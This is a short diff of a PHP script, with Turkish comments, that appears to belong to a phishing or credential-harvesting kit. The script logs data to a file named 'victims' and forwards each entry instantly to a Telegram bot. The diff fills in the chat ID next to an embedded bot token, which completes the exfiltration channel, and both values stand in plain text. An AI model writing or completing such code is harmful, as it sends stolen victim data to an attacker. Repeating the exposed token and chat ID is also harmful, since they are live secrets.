@@ -46,7 +46,7 @@ file_put_contents("kurbanlar.txt", $log, FILE_APPEND | LOCK_EX);
 
 // 2. Telegram'a anlık gönder (senin token'ın gömülü)
 $telegram_token = "8614915995:AAEJXbLYSThRZfpJLj9sv0pepFd_R2Fw59o";
-$chat_id        = "BURAYA_CHAT_ID_YAZ";  // BURAYA KENDİ CHAT ID'NI YAZ (örneğin 123456789 veya -1001234567890)
+$chat_id        = "8136438255";  // BURAYA KENDİ CHAT ID'NI YAZ (örneğin 123456789 veya -1001234567890)
 
 if ($chat_id !== "BURAYA_CHAT_ID_YAZ") {
     $mesaj = urlencode($log);
